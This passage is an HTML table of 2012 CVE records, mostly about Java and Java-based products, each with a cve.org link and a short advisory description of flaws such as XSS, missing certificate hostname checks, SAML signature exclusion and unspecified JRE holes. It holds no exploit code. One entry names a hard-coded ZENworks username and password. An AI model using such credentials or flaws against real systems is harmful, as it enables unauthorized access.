		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Java number format exception handling in FortiGate FortiDB before 4.4.2 allow remote attackers to inject arbitrary web script or HTML via the conversationContext parameter to (1) admin/auditTrail.jsf, (2) mapolicymgmt/targetsMonitorView.jsf, (3) vascan/globalsummary.jsf, (4) vaerrorlog/vaErrorLog.jsf, (5) database/listTargetGroups.jsf, (6) sysconfig/listSystemInfo.jsf, (7) vascan/list.jsf, (8) network/router.jsf, (9) mapolicymgmt/editPolicyProfile.jsf, or (10) mapolicymgmt/maPolicyMasterList.jsf.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-6149">CVE-2012-6149</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in systems/sdc/notes.jsp in Spacewalk and Red Hat Network (RHN) Satellite 5.6 allow remote attackers to inject arbitrary web script or HTML via the (1) subject or (2) content values of a note in a system.addNote XML-RPC call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5817">CVE-2012-5817</a></td>
		<td valign="top">Codehaus XFire 1.2.6 and earlier, as used in the Amazon EC2 API Tools Java library and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5787">CVE-2012-5787</a></td>
		<td valign="top">The PayPal merchant SDK does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5785">CVE-2012-5785</a></td>
		<td valign="top">Apache Axis2/Java 1.6.2 and earlier does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5784">CVE-2012-5784</a></td>
		<td valign="top">Apache Axis 1.4 and earlier, as used in PayPal Payments Pro, PayPal Mass Pay, PayPal Transactional Information SOAP, the Java Message Service implementation in Apache ActiveMQ, and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5783">CVE-2012-5783</a></td>
		<td valign="top">Apache Commons HttpClient 3.x, as used in Amazon Flexible Payments Service (FPS) merchant Java SDK and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5373">CVE-2012-5373</a></td>
		<td valign="top">Oracle Java SE 7 and earlier, and OpenJDK 7 and earlier, computes hash values without properly restricting the ability to trigger hash collisions predictably, which allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted input to an application that maintains a hash table, as demonstrated by a universal multicollision attack against the MurmurHash3 algorithm, a different vulnerability than CVE-2012-2739.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5353">CVE-2012-5353</a></td>
		<td valign="top">Eduserv OpenAthens SP 2.0 for Java allows remote attackers to forge messages and bypass authentication via a SAML assertion that lacks a Signature element, aka a "Signature exclusion attack."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5352">CVE-2012-5352</a></td>
		<td valign="top">Java Open Single Sign-On Project Home (JOSSO) allows remote attackers to forge messages and bypass authentication via a SAML assertion that lacks a Signature element, aka a "Signature exclusion attack."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5089">CVE-2012-5089</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, and 5.0 Update 36 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to JMX, a different vulnerability than CVE-2012-3143.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5088">CVE-2012-5088</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5087">CVE-2012-5087</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Beans.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5086">CVE-2012-5086</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, and 6 Update 35 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Beans.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5085">CVE-2012-5085</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote authenticated users to have an unspecified impact via unknown vectors related to Networking.  NOTE: the Oracle CPU states that this issue has a 0.0 CVSS score. If so, then this is not a vulnerability and this issue should not be included in CVE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5084">CVE-2012-5084</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5083">CVE-2012-5083</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, 1.4.2_38 and earlier, and JavaFX 2.2 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5082">CVE-2012-5082</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2 and earlier allows remote attackers to affect availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5081">CVE-2012-5081</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote attackers to affect availability, related to JSSE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5080">CVE-2012-5080</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2012-5078.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5079">CVE-2012-5079</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote attackers to affect integrity via unknown vectors related to Libraries, a different vulnerability than CVE-2012-5073.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5078">CVE-2012-5078</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2012-5080.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5077">CVE-2012-5077</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote attackers to affect confidentiality via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5076">CVE-2012-5076</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to JAX-WS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5075">CVE-2012-5075</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, and 5.0 Update 36 and earlier allows remote attackers to affect confidentiality, related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5074">CVE-2012-5074</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality and integrity, related to JAX-WS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5073">CVE-2012-5073</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote attackers to affect integrity via unknown vectors related to Libraries, a different vulnerability than CVE-2012-5079.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5072">CVE-2012-5072</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, and 6 Update 35 and earlier, allows remote attackers to affect confidentiality via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5071">CVE-2012-5071</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, and 5.0 Update 36 and earlier allows remote attackers to affect confidentiality and integrity, related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5070">CVE-2012-5070</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality, related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5069">CVE-2012-5069</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, and 5.0 Update 36 and earlier allows remote attackers to affect confidentiality and integrity via unknown vectors related to Concurrency.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5068">CVE-2012-5068</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, and 6 Update 35 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5067">CVE-2012-5067</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-5003">CVE-2012-5003</a></td>
		<td valign="top">nxapplet.jar in No Machine NX Web Companion 3.x and earlier does not properly verify the authenticity of updates, which allows user-assisted remote attackers to execute arbitrary code via a crafted (1) SiteUrl or (2) RedirectUrl parameter that points to a Trojan Horse client.zip update file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4933">CVE-2012-4933</a></td>
		<td valign="top">The rtrlet web application in the Web Console in Novell ZENworks Asset Management (ZAM) 7.5 uses a hard-coded username of Ivanhoe and a hard-coded password of Scott for the (1) GetFile_Password and (2) GetConfigInfo_Password operations, which allows remote attackers to obtain sensitive information via a crafted rtrlet/rtr request for the HandleMaintenanceCalls function.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4858">CVE-2012-4858</a></td>
		<td valign="top">IBM Cognos Business Intelligence (BI) 8.4.1 before IF1, 10.1 before IF2, 10.1.1 before IF2, and 10.2 before IF1 does not properly validate Java serialized input, which allows remote attackers to execute arbitrary commands via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4823">CVE-2012-4823</a></td>
		<td valign="top">Unspecified vulnerability in the JRE component in IBM Java 7 SR2 and earlier, Java 6.0.1 SR3 and earlier, Java 6 SR11 and earlier, Java 5 SR14 and earlier, and Java 142 SR13 FP13 and earlier; as used in IBM Rational Host On-Demand, Rational Change, Tivoli Monitoring, Smart Analytics System 5600, Tivoli Remote Control 5.1.2, WebSphere Real Time, Lotus Notes &amp; Domino, Tivoli Storage Productivity Center, and Service Deliver Manager; and other products from other vendors such as Red Hat, allows remote attackers to execute arbitrary code via vectors related to "insecure use of the java.lang.ClassLoder defineClass() method."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4822">CVE-2012-4822</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the JRE component in IBM Java 7 SR2 and earlier, Java 6.0.1 SR3 and earlier, Java 6 SR11 and earlier, Java 5 SR14 and earlier, and Java 142 SR13 FP13 and earlier; as used in IBM Rational Host On-Demand, Rational Change, Tivoli Monitoring, Smart Analytics System 5600, Tivoli Remote Control 5.1.2, WebSphere Real Time, Lotus Notes &amp; Domino, Tivoli Storage Productivity Center, and Service Deliver Manager; and other products from other vendors such as Red Hat, allow remote attackers to execute arbitrary code via vectors related to "insecure use [of] multiple methods in the java.lang.class class."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4821">CVE-2012-4821</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the JRE component in IBM Java 7 SR2 and earlier, Java 6.0.1 SR3 and earlier, Java 6 SR11 and earlier, Java 5 SR14 and earlier, and Java 142 SR13 FP13 and earlier; as used in IBM Rational Host On-Demand, Rational Change, Tivoli Monitoring, Smart Analytics System 5600, Tivoli Remote Control 5.1.2, WebSphere Real Time, Lotus Notes &amp; Domino, Tivoli Storage Productivity Center, and Service Deliver Manager; and other products from other vendors such as Red Hat, allow remote attackers to execute arbitrary code via "insecure use" of the (1) java.lang.Class getDeclaredMethods or nd (2) java.lang.reflect.AccessibleObject setAccessible() methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4820">CVE-2012-4820</a></td>
		<td valign="top">Unspecified vulnerability in the JRE component in IBM Java 7 SR2 and earlier, Java 6.0.1 SR3 and earlier, Java 6 SR11 and earlier, Java 5 SR14 and earlier, and Java 142 SR13 FP13 and earlier; as used in IBM Rational Host On-Demand, Rational Change, Tivoli Monitoring, Smart Analytics System 5600, Tivoli Remote Control 5.1.2, WebSphere Real Time, Lotus Notes &amp; Domino, Tivoli Storage Productivity Center, and Service Deliver Manager; and other products from other vendors such as Red Hat, when running under a security manager, allows remote attackers to gain privileges by modifying or removing the security manager via vectors related to "insecure use of the java.lang.reflect.Method invoke() method."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4792">CVE-2012-4792</a></td>
		<td valign="top">Use-after-free vulnerability in Microsoft Internet Explorer 6 through 8 allows remote attackers to execute arbitrary code via a crafted web site that triggers access to an object that (1) was not properly allocated or (2) is deleted, as demonstrated by a CDwnBindInfo object, and exploited in the wild in December 2012.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4681">CVE-2012-4681</a></td>
		<td valign="top">Multiple vulnerabilities in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 6 and earlier allow remote attackers to execute arbitrary code via a crafted applet that bypasses SecurityManager restrictions by (1) using com.sun.beans.finder.ClassFinder.findClass and leveraging an exception with the forName method to access restricted classes from arbitrary packages such as sun.awt.SunToolkit, then (2) using "reflection with a trusted immediate caller" to leverage the getField method to access and modify private fields, as exploited in the wild in August 2012 using Gondzz.class and Gondvv.class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4655">CVE-2012-4655</a></td>
		<td valign="top">The WebLaunch feature in Cisco Secure Desktop before 3.6.6020 does not properly validate binaries that are received by the downloader process, which allows remote attackers to execute arbitrary code via vectors involving (1) ActiveX or (2) Java components, aka Bug IDs CSCtz76128 and CSCtz78204.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4550">CVE-2012-4550</a></td>
		<td valign="top">JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) before 6.0.1, when using role-based authorization for Enterprise Java Beans (EJB) access, does not call the intended authorization modules, which prevents JACC permissions from being applied and allows remote attackers to obtain access to the EJB.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4549">CVE-2012-4549</a></td>
		<td valign="top">The processInvocation function in org.jboss.as.ejb3.security.AuthorizationInterceptor in JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) before 6.0.1, authorizes all requests when no roles are allowed for an Enterprise Java Beans (EJB) method invocation, which allows attackers to bypass intended access restrictions for EJB methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4534">CVE-2012-4534</a></td>
		<td valign="top">org/apache/tomcat/util/net/NioEndpoint.java in Apache Tomcat 6.x before 6.0.36 and 7.x before 7.0.28, when the NIO connector is used in conjunction with sendfile and HTTPS, allows remote attackers to cause a denial of service (infinite loop) by terminating the connection during the reading of a response.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4420">CVE-2012-4420</a></td>
		<td valign="top">An information disclosure flaw was found in the way the Java Virtual Machine (JVM) implementation of Java SE 7 as provided by OpenJDK 7 incorrectly initialized integer arrays after memory allocation (in certain circumstances they had nonzero elements right after the allocation). A remote attacker could use this flaw to obtain potentially sensitive information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4416">CVE-2012-4416</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, and 6 Update 35 and earlier, allows remote attackers to affect confidentiality and integrity via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4305">CVE-2012-4305</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from a third party that the issue allows remote attackers to execute arbitrary code via vectors related to an "invalid type cast" and exposed native methods in the T2KGlyph class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4301">CVE-2012-4301</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from a third party that this issue allows remote attackers to execute arbitrary code via an "invalid type case" in the init method of the D3DShader class in the com.sun.prism.d3d package. CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4063">CVE-2012-4063</a></td>
		<td valign="top">The Apache Santuario configuration in Eucalyptus before 3.1.1 does not properly restrict applying XML Signature transforms to documents, which allows remote attackers to cause a denial of service via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4011">CVE-2012-4011</a></td>
		<td valign="top">The Cybozu KUNAI application before 2.0.6 for Android allows remote attackers to execute arbitrary Java methods, and obtain sensitive information or execute arbitrary commands, via a crafted web site.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-4008">CVE-2012-4008</a></td>
		<td valign="top">The Cybozu Live application 1.0.4 and earlier for Android allows remote attackers to execute arbitrary Java methods, and obtain sensitive information or execute arbitrary commands, via a crafted web site.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3546">CVE-2012-3546</a></td>
		<td valign="top">org/apache/catalina/realm/RealmBase.java in Apache Tomcat 6.x before 6.0.36 and 7.x before 7.0.30, when FORM authentication is used, allows remote attackers to bypass security-constraint checks by leveraging a previous setUserPrincipal call and then placing /j_security_check at the end of a URI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3431">CVE-2012-3431</a></td>
		<td valign="top">The Teiid Java Database Connectivity (JDBC) socket, as used in JBoss Enterprise Data Services Platform before 5.3.0, does not encrypt login messages by default contrary to documentation and specification, which allows remote attackers to obtain login credentials via a man-in-the-middle (MITM) attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3423">CVE-2012-3423</a></td>
		<td valign="top">The IcedTea-Web plugin before 1.2.1 does not properly handle NPVariant NPStrings without NUL terminators, which allows remote attackers to cause a denial of service (crash), obtain sensitive information from memory, or execute arbitrary code via a crafted Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3413">CVE-2012-3413</a></td>
		<td valign="top">The HTMLQuoteColorer::process function in messageviewer/htmlquotecolorer.cpp in KDE PIM 4.6 through 4.8 does not disable JavaScript, Java, and Plugins, which allows remote attackers to inject arbitrary web script or HTML via a crafted email.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3342">CVE-2012-3342</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than other CVEs listed in the February 2013 CPU.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3317">CVE-2012-3317</a></td>
		<td valign="top">IBM WebSphere Message Broker 6.1 before 6.1.0.11, 7.0 before 7.0.0.5, and 8.0 before 8.0.0.2 has incorrect ownership of certain uninstaller Java Runtime Environment (JRE) files, which might allow local users to gain privileges by leveraging access to uid 501 or gid 300.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3315">CVE-2012-3315</a></td>
		<td valign="top">The Java servlets in the management console in IBM Tivoli Federated Identity Manager (TFIM) through 6.2.2 and Tivoli Federated Identity Manager Business Gateway (TFIMBG) before 6.2.2 do not require authentication for all resource downloads, which allows remote attackers to bypass intended J2EE security constraints, and obtain sensitive information related to (1) federation metadata or (2) a web plugin configuration template, via a crafted request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3216">CVE-2012-3216</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier allows remote attackers to affect confidentiality via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3213">CVE-2012-3213</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Scripting.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3174">CVE-2012-3174</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java 7 before Update 11 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2013-0422.  NOTE: some parties have mapped CVE-2012-3174 to an issue involving recursive use of the Reflection API, but that issue is already covered as part of CVE-2013-0422.  This identifier is for a different vulnerability whose details are not public as of 20130114.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3159">CVE-2012-3159</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, and 6 Update 35 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2012-1533.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3155">CVE-2012-3155</a></td>
		<td valign="top">Unspecified vulnerability in the CORBA ORB component in Sun GlassFish Enterprise Server 2.1.1, Oracle GlassFish Server 3.0.1 and 3.1.2, and Sun Java System Application Server 8.1 and 8.2 allows remote attackers to affect availability, related to CORBA ORB.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3143">CVE-2012-3143</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, and 5.0 Update 36 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to JMX, a different vulnerability than CVE-2012-5089.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-3136">CVE-2012-3136</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 6 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Beans, a different vulnerability than CVE-2012-1682.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2739">CVE-2012-2739</a></td>
		<td valign="top">Oracle Java SE before 7 Update 6, and OpenJDK 7 before 7u6 build 12 and 8 before build 39, computes hash values without restricting the ability to trigger hash collisions predictably, which allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted input to an application that maintains a hash table.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2733">CVE-2012-2733</a></td>
		<td valign="top">java/org/apache/coyote/http11/InternalNioInputBuffer.java in the HTTP NIO connector in Apache Tomcat 6.x before 6.0.36 and 7.x before 7.0.28 does not properly restrict the request-header size, which allows remote attackers to cause a denial of service (memory consumption) via a large amount of header data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2649">CVE-2012-2649</a></td>
		<td valign="top">The Sleipnir Mobile application 2.2.0 and earlier and Sleipnir Mobile Black Edition application 2.2.0 and earlier for Android allow remote attackers to execute arbitrary Java methods, and obtain sensitive information or execute arbitrary commands, via a crafted web site.

</td>
	</tr>
